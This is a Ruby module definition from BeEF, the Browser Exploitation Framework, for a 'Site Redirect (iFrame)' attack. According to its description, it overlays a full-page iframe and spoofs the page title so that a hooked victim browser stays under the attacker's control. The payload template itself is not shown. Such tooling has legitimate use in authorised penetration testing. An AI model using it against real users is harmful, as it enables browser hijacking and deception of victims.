class Site_redirect_iframe < BeEF::Core::Command
  
  	#
  	# Defines and set up the command module.
  	#
	def initialize
		super({
      'Name' => 'Site Redirect (iFrame)',
      'Description' => 'This module will redirect the hooked browser to the address specified in the \'Redirect URL\' input. It creates a 100% x 100% overlaying iframe to keep the victim hooked and changes the page title to the provided value which should be set to the title of the redirect URL.',
      'Category' => 'Browser',
      'Author' => ['ethicalhack3r, Yori Kvitchko'],
			'Data' => [
			  { 'name' => 'iframe_title', 'ui_label' => 'New Page Title', 'value' => 'BindShell.Net: Home', 'width'=>'200px' },
			  { 'name' => 'iframe_src', 'ui_label' => 'Redirect URL', 'value' => 'http://www.bindshell.net/', 'width'=>'200px' },
			  { 'name' => 'iframe_timeout', 'ui_label' => 'Timeout', 'value' => '3500', 'width'=>'150px' }
			],
	    'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_USER_NOTIFY, 
      'browser_name' =>     ALL
    })
          
    use_template!
	end

  # This method is being called when a hooked browser sends some
  # data back to the framework.
  #
  def callback
    save({'result' => @datastore['result']})
  end
  
end